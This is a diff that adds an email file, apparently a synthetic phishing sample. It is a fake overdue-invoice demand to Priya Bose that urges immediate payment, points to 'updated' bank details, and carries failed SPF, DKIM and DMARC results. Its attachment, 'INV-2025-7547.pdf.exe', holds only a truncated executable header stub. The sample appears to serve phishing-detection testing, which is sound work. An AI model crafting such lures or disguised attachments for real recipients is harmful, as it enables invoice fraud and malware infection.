@@ -1,0 +1,83 @@
+From: "Zenith Traders Accounts" <billing@itr-refund-portal.click>
+To: Priya Bose <priya.bose@meridian-labs.org>
+Subject: Remittance advice INV-2025-7547 - action required
+Date: Sat, 02 May 2026 12:35:00 +0000
+Message-ID: <178772093907.6.14091576538253311552@itr-refund-portal.click>
+Return-Path: <bounce-1964@itr-refund-portal.click>
+MIME-Version: 1.0
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by mx.meridian-labs.org (Postfix) with ESMTPS id D318DDDBC15A for
+ <recipient@meridian-labs.org>; Sat, 02 May 2026 12:35:00 +0000
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ vps-31.hosting.example (Postfix) with ESMTPS id 7FD06084A4EE; Sat, 02 May
+ 2026 12:31:43 +0000
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ mx1.mail-relay.example (Postfix) with ESMTPS id C33D0EA1B101; Sat, 02 May
+ 2026 12:25:25 +0000
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by smtp-out-3.example (Postfix) with ESMTPS id 9ADDD639CDCC;
+ Sat, 02 May 2026 12:21:49 +0000
+Received: from compute-04.cloudprovider.example
+ (compute-04.cloudprovider.example [198.51.100.150]) by
+ edge-2.mailcluster.example (Postfix) with ESMTPS id F899E9C32ECF; Sat, 02 May
+ 2026 12:18:32 +0000
+Received-SPF: softfail (mailfrom) identity=mailfrom; client-ip=192.0.2.201;
+ envelope-from=<bounce@itr-refund-portal.click>;
+Authentication-Results: mx.itr-refund-portal.click; spf=softfail
+ smtp.mailfrom=itr-refund-portal.click; dkim=fail
+ header.d=itr-refund-portal.click; dmarc=fail (p=reject)
+ header.from=itr-refund-portal.click
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=itr-refund-portal.click; s=selector1; t=666569056; h=from:to:subject:date;
+ bh=vm0caD07a4Tg1a1NNfWiU6k9GvTF6fXITkhyiUiWskg=; =?utf-8?q?b=3DBfhoKtI/w5VV?=
+ =?utf-8?q?/Ihf0TbeNwwnDUCwabgYlm6LAyorn0Vrd2l42Acdiavzy3f20mtViwS0gQnW1kfUg?=
+ =?utf-8?q?kDubK8HXg=3D=3D?=
+Content-Type: multipart/mixed; boundary="===============7434493844132806246=="
+
+--===============7434493844132806246==
+Content-Type: multipart/alternative;
+ boundary="===============3776200922526069711=="
+
+--===============3776200922526069711==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello Priya,
+
+Please find attached invoice INV-2025-7547 for EUR 7,386,000, now overdue. Ki=
+ndly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Ishita Reddy
+Accounts Receivable, Zenith Traders
+
+--===============3776200922526069711==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Priya,</p><p>Please find attached invoice INV-2025-7547 =
+for EUR 7,386,000, now overdue. Kindly review the attached statement and proc=
+ess this payment immediately to avoid service interruption.</p><p>If the bank=
+ details have changed since your last remittance, use the updated account inf=
+ormation in the attachment.</p><p>Regards, Ishita Reddy Accounts Receivable, =
+Zenith Traders</p></body></html>
+
+--===============3776200922526069711==--
+
+--===============7434493844132806246==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2025-7547.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============7434493844132806246==--
